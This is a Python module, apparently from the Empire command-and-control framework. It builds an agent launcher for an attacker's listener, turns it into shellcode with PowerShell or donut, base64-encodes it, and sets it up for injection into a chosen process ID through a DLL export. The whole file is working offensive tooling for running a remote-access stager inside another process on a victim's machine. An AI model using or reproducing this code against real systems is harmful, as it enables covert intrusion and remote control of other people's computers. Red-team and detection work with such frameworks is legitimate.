from empire.server.core.exceptions import (
    ModuleValidationException,
)

try:
    import donut
except ModuleNotFoundError:
    donut = None


from empire.server.common import helpers
from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # staging options
        listener_name = params["Listener"]
        pid = params["pid"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscation_command = params["ObfuscateCommand"]
        language = params["Language"]
        dot_net_version = params["DotNetVersion"].lower()
        arch = params["Architecture"]
        launcher_obfuscation = params["Obfuscate"]
        export = params["ExportFunction"]
        dll = params["dll"]

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            raise ModuleValidationException("Invalid listener: " + listener_name)

        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name=listener_name,
            language=language,
            encode=False,
            obfuscate=launcher_obfuscation,
            obfuscation_command=launcher_obfuscation_command,
            user_agent=user_agent,
            proxy=proxy,
            proxy_creds=proxy_creds,
        )

        if not launcher or launcher.lower() == "failed":
            raise ModuleValidationException("Invalid launcher")

        if language.lower() == "powershell":
            shellcode, err = main_menu.stagergenv2.generate_powershell_shellcode(
                launcher, arch=arch, dot_net_version=dot_net_version
            )
            if err:
                raise ModuleValidationException(err)

        elif language.lower() == "csharp":
            arch_type = {"x86": 1, "x64": 2, "both": 3}.get(arch, 2)

            if not donut:
                raise ModuleValidationException(
                    "module donut-shellcode not installed. It is only supported on x86."
                )

            shellcode = donut.create(file=str(launcher), arch=arch_type)

        base64_shellcode = helpers.encode_base64(shellcode).decode("UTF-8")

        params_dict = {
            "Shellcode": f"--shellcode={base64_shellcode}",
            "pid": f"--pid={pid}",
            "dll": f"--dll={dll}",
            "ExportFunction": f"--export={export}",
            "DotNetVersion": dot_net_version,
        }

        with SessionLocal() as db:
            obfuscation_config = main_menu.obfuscationv2.get_obfuscation_config(
                db, module.language
            )

        return main_menu.modulesv2.generate_script_csharp(
            module=module, params=params_dict, obfuscation_config=obfuscation_config
        )
